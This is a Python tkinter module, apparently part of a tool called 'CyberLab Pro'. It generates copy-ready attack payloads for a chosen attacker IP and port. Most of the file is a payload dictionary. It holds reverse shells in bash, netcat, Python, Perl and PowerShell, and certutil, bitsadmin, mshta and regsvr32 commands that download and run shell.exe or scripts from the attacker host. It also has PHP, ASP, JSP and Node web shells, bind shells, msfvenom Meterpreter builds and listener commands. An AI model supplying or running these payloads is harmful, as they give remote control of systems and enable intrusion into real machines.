"""
CyberLab Pro - Payload Generator
Generate reverse shells, web shells, bind shells, MSFVenom payloads.
All payloads copyable with one click. Organized by type and platform.
"""
import tkinter as tk
from tkinter import messagebox
from gui.base_module import BaseModule
from gui.dropdown import Dropdown
import os

class PayloadGenerator(BaseModule):
    def __init__(self, parent, db, logger):
        super().__init__(parent)
        self.db = db
        self.logger = logger
        
        # Payload database
        self.payloads = {
            "Linux Reverse Shells": {
                "Bash TCP": "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
                "Bash UDP": "sh -i >& /dev/udp/{IP}/{PORT} 0>&1",
                "Netcat Traditional": "nc -e /bin/sh {IP} {PORT}",
                "Netcat OpenBSD": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f",
                "Python": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                "Perl": "perl -e 'use Socket;$i=\"{IP}\";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
                "PHP": "php -r '$sock=fsockopen(\"{IP}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                "Ruby": "ruby -rsocket -e 'f=TCPSocket.open(\"{IP}\",{PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                "AWK": "awk 'BEGIN {s = \"/inet/tcp/0/{IP}/{PORT}\"; while(1) {do {printf \"> \" |& s; s |& getline c; if(c) {while ((c |& getline) > 0) print $0 |& s; close(c)}} while(c != \"exit\"); close(s)}}'",
                "Telnet": "TF=$(mktemp -u);mkfifo $TF && telnet {IP} {PORT} 0<$TF | /bin/sh 1>$TF;rm $TF",
                "Lua": "lua -e \"local s=require('socket');local t=assert(s.tcp());t:connect('{IP}',{PORT});while true do local r,x=t:receive();local f=io.popen(r,'r');local b=f:read('*a');t:send(b);end;f:close();t:close();\"",
            },
            "Windows Reverse Shells": {
                "PowerShell TCP": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
                "PowerShell Base64": "powershell -e {BASE64}",
                "Certutil": "certutil -urlcache -f http://{IP}/shell.exe shell.exe && shell.exe",
                "Bitsadmin": "bitsadmin /transfer job /download /priority high http://{IP}/shell.exe %temp%\\shell.exe && %temp%\\shell.exe",
                "MSHTA": "mshta http://{IP}/shell.hta",
                "Regsvr32": "regsvr32 /s /n /u /i:http://{IP}/shell.sct scrobj.dll",
                "Rundll32": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";new ActiveXObject('WScript.Shell').Run('cmd /c powershell -c ...')",
                "WMI": "wmic /node:{IP} /user:admin /password:pass process call create \"cmd /c shell.exe\"",
            },
            "Web Shells": {
                "PHP Simple": "<?php system($_GET['cmd']); ?>",
                "PHP Full": "<?php echo '<pre>'; system($_GET['cmd']); echo '</pre>'; ?>",
                "PHP File Upload": "<?php move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']); ?>",
                "PHP Download": "<?php file_put_contents($_GET['file'], file_get_contents($_GET['url'])); ?>",
                "ASP Classic": "<% Dim oS : Set oS = Server.CreateObject(\"WSCRIPT.SHELL\") : Response.Write(oS.Exec(\"cmd /c \" & Request(\"cmd\")).StdOut.ReadAll()) %>",
                "ASPX": "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \" + Request[\"cmd\"]); %>",
                "JSP": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
                "Node.js": "require('child_process').exec(req.query.cmd);",
                "Python CGI": "#!/usr/bin/env python3\nimport os\nprint(\"Content-Type: text/plain\\n\")\nos.system(\"export HOME=/tmp && \" + __import__('urllib.parse').parse_qs(__import__('os').environ.get('QUERY_STRING','')).get('cmd',['id'])[0])",
            },
            "Bind Shells": {
                "Netcat Bind": "nc -lvp {PORT} -e /bin/sh",
                "Python Bind": "python3 -c 'import socket,subprocess;s=socket.socket();s.bind((\"0.0.0.0\",{PORT}));s.listen(1);c,a=s.accept();\nwhile True:\n d=c.recv(1024).decode();\n if not d:break\n o=subprocess.run(d,shell=True,capture_output=True,text=True).stdout\n c.send(o.encode())'",
                "Socat Bind": "socat TCP-LISTEN:{PORT},reuseaddr,fork EXEC:/bin/sh",
                "PowerShell Bind": "powershell -c \"$l=New-Object System.Net.Sockets.TcpListener('0.0.0.0',{PORT});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close();$l.Stop()\"",
            },
            "MSFVenom Payloads": {
                "Linux ELF Reverse TCP": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f elf -o shell.elf",
                "Linux ELF Bind TCP": "msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=0.0.0.0 LPORT={PORT} -f elf -o bind.elf",
                "Windows EXE Reverse TCP": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f exe -o shell.exe",
                "Windows EXE Bind TCP": "msfvenom -p windows/meterpreter/bind_tcp RHOST=0.0.0.0 LPORT={PORT} -f exe -o bind.exe",
                "Windows DLL Reverse TCP": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f dll -o shell.dll",
                "Android APK Reverse TCP": "msfvenom -p android/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -o payload.apk",
                "Android APK Bind TCP": "msfvenom -p android/meterpreter/bind_tcp RHOST=0.0.0.0 LPORT={PORT} -o bind.apk",
                "PHP Meterpreter": "msfvenom -p php/meterpreter_reverse_tcp LHOST={IP} LPORT={PORT} -f raw -o shell.php",
                "Python Meterpreter": "msfvenom -p python/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -o shell.py",
                "Bash Meterpreter": "msfvenom -p cmd/unix/reverse_bash LHOST={IP} LPORT={PORT} -f raw",
                "Mac OSX Reverse TCP": "msfvenom -p osx/x86/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f macho -o shell.macho",
                "Solaris Reverse TCP": "msfvenom -p solaris/x86/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f elf -o shell.elf",
                "Web WAR Payload": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={IP} LPORT={PORT} -f war -o shell.war",
                "ASP Classic": "msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT} -f asp -o shell.asp",
                "Powershell Base64": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f psh-cmd",
            },
            "Listener Commands": {
                "Netcat Listener": "nc -lvnp {PORT}",
                "MSFConsole Handler": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD {PAYLOAD}; set LHOST {IP}; set LPORT {PORT}; run'",
                "Socat Listener": "socat file:`tty`,raw,echo=0 TCP-LISTEN:{PORT}",
                "Python PTY Listener": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
                "Rlwrap Netcat": "rlwrap nc -lvnp {PORT}",
            },
        }
    
    def build_content(self):
        self.add_title("Payload Generator", "Reverse shells, web shells, bind shells, MSFVenom payloads")
        
        # IP and Port inputs
        config = tk.Frame(self.inner, bg='#16213e', padx=10, pady=8)
        config.pack(fill='x', padx=10, pady=5)
        
        tk.Label(config, text="LHOST (Your IP):", font=('Courier', 10), fg='#fff', bg='#16213e').pack(anchor='w')
        self.ip_entry = tk.Entry(config, font=('Courier', 11), bg='#0f3460', fg='#fff', relief='flat')
        self.ip_entry.pack(fill='x', pady=3)
        self.ip_entry.insert(0, '10.0.0.1')
        
        tk.Label(config, text="LPORT:", font=('Courier', 10), fg='#fff', bg='#16213e').pack(anchor='w')
        self.port_entry = tk.Entry(config, font=('Courier', 11), bg='#0f3460', fg='#fff', relief='flat', width=10)
        self.port_entry.pack(fill='x', pady=3)
        self.port_entry.insert(0, '4444')
        
        # Each category as a dropdown
        for category, payloads in self.payloads.items():
            def make_content(parent, cat=category, pl=payloads):
                for name, code in pl.items():
                    card = tk.Frame(parent, bg='#16213e', padx=8, pady=6)
                    card.pack(fill='x', pady=1)
                    
                    h = tk.Frame(card, bg='#16213e')
                    h.pack(fill='x')
                    tk.Label(h, text=name, font=('Courier', 9, 'bold'), fg='#00ff88', bg='#16213e').pack(side='left')
                    tk.Button(h, text="Copy", font=('Courier', 7), fg='#000', bg='#00ccff', relief='flat', padx=6,
                            command=lambda c=code: self._copy_payload(c)).pack(side='right', padx=1)
                    tk.Button(h, text="Preview", font=('Courier', 7), fg='#000', bg='#ffaa00', relief='flat', padx=6,
                            command=lambda n=name, c=code: self._preview(n, c)).pack(side='right', padx=1)
                    
                    preview_text = code[:80].replace('{IP}', self.ip_entry.get()).replace('{PORT}', self.port_entry.get())
                    tk.Label(card, text=preview_text + '...', font=('Courier', 7), fg='#888', bg='#16213e',
                            wraplength=self.canvas.winfo_width()-80).pack(anchor='w')
            
            icon_map = {"Linux":"🐧","Windows":"🪟","Web":"🌍","Bind":"🔗","MSFVenom":"💣","Listener":"📡"}
            icon = icon_map.get(category.split()[0], '📄')
            self.add_section(category, make_content, icon)
    
    def _copy_payload(self, code):
        """Copy payload with IP and port substituted"""
        ip = self.ip_entry.get().strip()
        port = self.port_entry.get().strip()
        payload = code.replace('{IP}', ip).replace('{PORT}', port)
        try:
            self.frame.clipboard_clear()
            self.frame.clipboard_append(payload)
            messagebox.showinfo("Copied", f"Payload copied to clipboard!\n\n{payload[:100]}...")
        except:
            messagebox.showinfo("Copy this", payload[:500])
    
    def _preview(self, name, code):
        """Show full payload in a dialog"""
        ip = self.ip_entry.get().strip()
        port = self.port_entry.get().strip()
        payload = code.replace('{IP}', ip).replace('{PORT}', port)
        
        d = tk.Toplevel(self.frame, bg='#1a1a2e')
        d.title(f"Payload: {name}"); d.geometry("650x400")
        tk.Label(d, text=name, font=('Courier', 12, 'bold'), fg='#00ff88', bg='#1a1a2e').pack(pady=10)
        
        t = tk.Text(d, font=('Courier', 9), bg='#0a0a0a', fg='#00ff88', relief='flat', wrap='word')
        t.pack(fill='both', expand=True, padx=10, pady=10)
        t.insert('1.0', payload)
        
        bf = tk.Frame(d, bg='#1a1a2e')
        bf.pack(pady=10)
        tk.Button(bf, text="Copy", font=('Courier', 10, 'bold'), fg='#000', bg='#00ff88', relief='raised', padx=15, pady=6,
                command=lambda: [d.clipboard_clear(), d.clipboard_append(payload), messagebox.showinfo("Copied", "Payload copied!")]).pack(side='left', padx=3)
        tk.Button(bf, text="Close", font=('Courier', 10), fg='#fff', bg='#666', relief='raised', padx=15, pady=6,
                command=d.destroy).pack(side='left', padx=3)
